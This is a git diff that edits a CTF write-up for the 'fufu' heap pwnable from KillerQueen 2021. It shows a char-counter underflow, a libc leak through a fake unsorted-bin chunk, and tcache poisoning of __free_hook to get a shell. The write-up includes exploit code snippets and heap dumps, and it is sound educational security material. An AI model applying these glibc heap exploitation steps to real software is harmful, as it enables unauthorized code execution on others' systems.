@@ -1,4 +1,12 @@
-# Code analysis
+# fufu writeup from KillerQueen2021 CTF
+
+I played KQ with my team DragonSec SI. We ended up winning and during the competition I was able to solve 2 pwnables one of them being this one. I found the challenges very interesting and so decided to write this writeup.
+
+
+# CODE ANALYSIS
+
+We are given a dynamically linked elf binary written in C.
+
 ## main
 We can see that main will run in a loop asking us to input a number and calling one of the 3 functions or
 exiting right away.
@@ -14,7 +22,7 @@ we can take a look at menu function just to get a feel for what we are up agains
 aaaand its the usual menu we all love to hate(hinting that this is going to be a heap challenge). Based
 on the previous challenge written by Rythm I knew at this point that this will be a long one.
 
-Diving right in we start to figure out what the binary does. There is not much to it. We have 3 functions(reset(),create(),display()) that we are working with
+Diving right in we start to figure out what the binary does. There is not much to it. We have 3 functions(reset(),create(), and display()) that we are working with
 
 ## create
 
@@ -56,11 +64,23 @@ The vulnerability lies in the custom inbuf function that uses a char type counte
 
 I found no other vulnerabilities in this bin. But this is more than enough to get a shell.
 
-# Exploitation
+# EXPLOITATION
+
+tl;dr
+
+- create fake chunk size 0x420
+- free it to place libc pointers on stack
+- create overlapping chunks to read the pointers -> leak
+- setup 3 chunks, 2 free 1 malloced
+- with 3rd overwrite size of second
+- malloc 2nd and free it again to switch tcache
+- again use 3rd to change 2nd fw to __free_hook
+- overwrite __free_hook
+- free("/bin/sh")
 
 ## checksec
 
-if we run the checksec tool in our binary we see that pie is enabled and that there are no canaries and no full relro.
+if we run the checksec tool on our binary we see that pie is enabled and that there are no canaries and no full relro.
 
 ## libc
 
@@ -112,11 +132,11 @@ create(0,0x90,"FFFFFF") <--- chunk F
 
 Usually how we get libc addresses on heap is by using unsorted bins. The idea is to malloc a large enough chunk(>0x408) that when freed it ends up in the unsorted bin. At that point libc addresses are put in its fw and bk pointers. The problem we are facing is that when a big chunk like that is freed and there are no other chunks between it and the top chunk it will get consolidated and our plan won't work.
 
-So the way I deal with this is to malloc enough chunks so that their combined size is greater than 0x408 and then using the underflow change the first chunk's size to 0x408 and then free it. by doing that there will be at least one chunk between our fake chunk that I resized and the top chunk so it will not get consolidated. 
+So the way I deal with this is to malloc enough chunks so that their combined size is greater than 0x408 and then using the underflow change the first chunk's size to 0x421 and then free it. by doing that there will be at least one chunk between our fake chunk that I resized and the top chunk so it will not get consolidated. 
 
 ```
-create(0,0x60,0x20*b'A') <----- chunk A we will resize this one to 0x421
-create(0,0x200,0x20*b'B') <---- chunk B this one we will use to perform the underflow
+create(0,0x60,0x20*b'A') <----- chunk A. We will resize this one to 0x421
+create(0,0x200,0x20*b'B') <---- chunk B. This one we will use to perform the underflow
 
 create(0,0x70,0x70*b'C') 
 reset(0)
@@ -129,7 +149,7 @@ payload += p64(0x420)
 payload += p64(0x61)
 payload += p64(0)
 payload += p64(0)
-create(0,0x70,payload) <------- chunk C inside this one we create a fake chunk to pass the chek for freeing into unsorted bin
+create(0,0x70,payload) <------- chunk C. Inside this one we create a fake chunk to pass the chek for freeing into unsorted bin
 
 
 reset(0)
@@ -139,7 +159,7 @@ payload += p64(0x421) <----- this will overwrite the size of chunk A to 0x421 us
 create(0,0x200,payload) <---- chunk B that is returned from tcache
 ```
 
-all the chunks that are in between chunks C and B are there just so that when A is resized and freed the pointer &A +0x420 points to area on the heap that we control(our fake chunk inside chunk C)
+all the chunks that are between chunks C and B are there just so that when A is resized and freed the pointer &A +0x420 points to area on the heap that we control(our fake chunk inside chunk C)
 
 you might be also wondering what role do the reset(0) calls play. Well if you scroll up a bit you will see that the reset function sets the chnk[0] pointer to 0. So when free is called our chunks that were reset will not be freed.
 
@@ -203,7 +223,7 @@ before:
 
 after:
 ```
-0x56257ccda3a0:	0x0000000000000000	0x0000000000000421 <--- chunk A that we resized using the underflow>
+0x56257ccda3a0:	0x0000000000000000	0x0000000000000421 <--- chunk A that we resized using the underflow
 0x56257ccda3b0:	0x0000000000000000	0x000056257ccda010
 0x56257ccda3c0:	0x4141414141414141	0x4141414141414141
 0x56257ccda3d0:	0x0000000000000000	0x0000000000000000
@@ -286,7 +306,7 @@ if you pay close attention to the code posted above you will see, that we freed 
 create(0,0x60,0x8*b'F')
 ```
 
-that call returned our chunk A from tcache size 0x70 even tho the actual size is 0x421. This is because when we freed it it was still size 0x71 and so it was stored in tcache.
+that call returned our chunk A from tcache size 0x70 even tho the actual size is 0x421. This is because when we freed it it was still size 0x71 and so it was stored in tcache 0x70.
 
 now we free it by mallocing a new chunk(the code of create())
 
@@ -294,7 +314,7 @@ now we free it by mallocing a new chunk(the code of create())
 create(0,0xe0,b'WWWWWWWW')
 ```
 
-the size of this allocation(0xe0) is important.
+the size of this allocation(0xe0) is important. We will see why soon.
 
 the state of the heap after the call for malloc(0xe0):
 ```
@@ -373,7 +393,7 @@ the state of the heap after the call for malloc(0xe0):
 0x56257ccda820:	0x0000000000000000	0x00000000000207e1
 ```
 
-you might wonder why chunk A shrunk. That is to do with the way the unsorted bins serves the allocations. Whenever there is a request by malloc for new chunk of a given size, if the tcache of that size is empty and the fastbin of that size is also empty, the new chunk will come out of the unsorted bin by substracting its size from the size of the chunk currently in unsorted bin. In our case 0x420-0xf0 = 0x330.
+you might wonder why chunk A shrunk. That is to do with the way the unsorted bin serves the allocations. Whenever there is a request by malloc for a new chunk of a given size, if the tcache of that size is empty and the fastbin of that size is also empty, the new chunk will come out of the unsorted bin by substracting its size from the size of the chunk currently in the unsorted bin. In our case 0x420-0xf0 = 0x330.
 
 ## deal with the null termination in inbuf
 I mentioned that the size 0xe0 was not chosen randomly. It is actually more than that, if we request any larger or smaller sized chunk the next part of the exploit will fail. The whole point of even allocating here is to push the libc pointers lower down the heap so that chunk A overlaps with chunk B in a very specific way
@@ -388,15 +408,15 @@ Not just that, we were also able to write exacly 128 Bs in chunk B and that's ho
 from inbuf. The null byte gets written at 0x56257ccda420 + local_9 where local_9 is the char counter that overflows to -128.
 
 ```
-0x56257ccda3a0:	0x0000000000000000	0x00000000000000f1 -
+0x56257ccda3a0:	0x0000000000000000	0x00000000000000f1 
 0x56257ccda3b0:	0x0000000000000000	0x000056257ccda010
 0x56257ccda3c0:	0x000056257ccda3a0	0x000056257ccda3a0
 0x56257ccda3d0:	0x0000000000000000	0x0000000000000000
 0x56257ccda3e0:	0x0000000000000000	0x0000000000000000
 0x56257ccda3f0:	0x0000000000000000	0x0000000000000000
 0x56257ccda400:	0x0000000000000000	0x0000000000000000
-0x56257ccda410:	0x0000000000000000	0x0000000000000211 <--- chunk B that we just malloced back from tcache>
-0x56257ccda420:	0x4242424242424242	0x4242424242424242 <--- the 0x80 or 128 Bs we wrote>
+0x56257ccda410:	0x0000000000000000	0x0000000000000211 <--- chunk B that we just malloced back from tcache
+0x56257ccda420:	0x4242424242424242	0x4242424242424242 <--- the 0x80 or 128 Bs we wrote
 0x56257ccda430:	0x4242424242424242	0x4242424242424242
 0x56257ccda440:	0x4242424242424242	0x4242424242424242
 0x56257ccda450:	0x4242424242424242	0x4242424242424242
@@ -490,14 +510,14 @@ display(0)
 0x56257ccda370:	0x0000000000000000	0x0000000000000000
 0x56257ccda380:	0x0000000000000000	0x0000000000000000
 0x56257ccda390:	0x0000000000000000	0x0000000000000000
-0x56257ccda3a0:	0x0000000000000000	0x00000000000000f1 <--- chunk we used to push down the pointers size 0xe0>
+0x56257ccda3a0:	0x0000000000000000	0x00000000000000f1 <--- chunk we used to push down the pointers size 0xe0
 0x56257ccda3b0:	0x0000000000000000	0x000056257ccda010
 0x56257ccda3c0:	0x000056257ccda3a0	0x000056257ccda3a0
 0x56257ccda3d0:	0x0000000000000000	0x0000000000000000
 0x56257ccda3e0:	0x0000000000000000	0x0000000000000000
 0x56257ccda3f0:	0x0000000000000000	0x0000000000000000
 0x56257ccda400:	0x0000000000000000	0x0000000000000000
-0x56257ccda410:	0x0000000000000000	0x0000000000000211 <--- chunk B>
+0x56257ccda410:	0x0000000000000000	0x0000000000000211 <--- chunk B
 0x56257ccda420:	0x4242424242424242	0x4242424242424242
 0x56257ccda430:	0x4242424242424242	0x4242424242424242
 0x56257ccda440:	0x4242424242424242	0x4242424242424242
@@ -590,7 +610,7 @@ First I malloc from tcache 0x21 chunk D
 create(0,0x10,b'aAA')
 ```
 
-then I malloc from tcache 0x51 chunk E and with that free chunk D back into tcahce 0x21
+then I malloc from tcache 0x51 chunk E and with that free chunk D back into tcache 0x21
 
 ```
 create(0,0x40, b'VVV')
@@ -603,7 +623,7 @@ create(0,0x40, b'VVV')
 0x56257ccda2d0:	0x0000000000000000	0x0000000000000000
 0x56257ccda2e0:	0x0000000000000000	0x0000000000000000
 0x56257ccda2f0:	0x0000000000000000	0x0000000000000000
-0x56257ccda300:	0x0000000000000000	0x00000000000000a1 <--- chunk F. Free>
+0x56257ccda300:	0x0000000000000000	0x00000000000000a1 <--- chunk F. Free
 0x56257ccda310:	0x0000000000000000	0x000056257ccda010
 0x56257ccda320:	0x0000000000000000	0x0000000000000000
 0x56257ccda330:	0x0000000000000000	0x0000000000000000
@@ -616,7 +636,7 @@ create(0,0x40, b'VVV')
 0x56257ccda3a0:	0x0000000000000000	0x00000000000000f1
 ```
 
-after that I construct a payload that will use the uderflow to change the size of E to 0x21. But before that E will be freed into tcache 0x51. for the overflow I will use chunk F that I will allocat back from tcache 0xa0
+after that I construct a payload that will use the underflow to change the size of E to 0x21. But before that, E will be freed into tcache 0x51. for the overflow I will use chunk F that I will allocate back from tcache 0xa0
 
 ```
 payload = 0x80 * b'B' <--- 128 Bs to overflow char
@@ -636,7 +656,7 @@ create(0,0x90,payload) <--- chunk F from tcache>
 0x56257ccda2d0:	0x0000000000000000	0x0000000000000000
 0x56257ccda2e0:	0x0000000000000000	0x0000000000000000
 0x56257ccda2f0:	0x0000000000000000	0x0000000000000000
-0x56257ccda300:	0x0000000000000000	0x00000000000000a1 <--- chunk F. Malloc>
+0x56257ccda300:	0x0000000000000000	0x00000000000000a1 <--- chunk F. Malloc
 0x56257ccda310:	0x4242424242424242	0x4242424242424242
 0x56257ccda320:	0x4242424242424242	0x4242424242424242
 0x56257ccda330:	0x4242424242424242	0x4242424242424242
@@ -658,7 +678,7 @@ payload += p64(__free_hook) <--- update the payload with __free_hook
 create(0,0x90, payload) <--- malloc F back and use the underflow again but now write __free_hook in E's fw
 ```
 
-We have no successfuly poisoned the 0x21 size tcache as it wend from E->D to E->__free_hook and count stayed 2.
+We have now successfuly poisoned the 0x21 size tcache as it went from E->D to E->__free_hook and count did not change.
 
 ```
 0x56257ccda290:	0x0000000000000000	0x0000000000000021 <--- chunk D. Free
@@ -681,7 +701,7 @@ We have no successfuly poisoned the 0x21 size tcache as it wend from E->D to E->
 0x56257ccda3a0:	0x0000000000000000	0x00000000000000f1
 ```
 
-All that is left to be done is to malloc 2 chunks of size 0x21 withou freeing them in between. For that we again use reset(0). And then
+All that is left to be done is to malloc 2 chunks of size 0x21 without freeing them in between. For that we again use reset(0). And then....
 
 ```
 create(0,0x10,b'RRRR') <--- malloc E from tcache
@@ -698,3 +718,10 @@ p.sendline('0')<--- send index 0
 p.interactive()
 ```
 
+SHELL!
+
+# CONCLUSION
+
+This my first in depth writeup and I hope you found it useful. All I know about pwn came from reading writeups like this one and so it seems fair I start giving back to the community.
+
+Challenges like this one can seem really hard to wrap head around for beginners. But with time and experience it gets easier(Not easy, just easier haha). Thanks to Rythm for creating this awesome challenge.
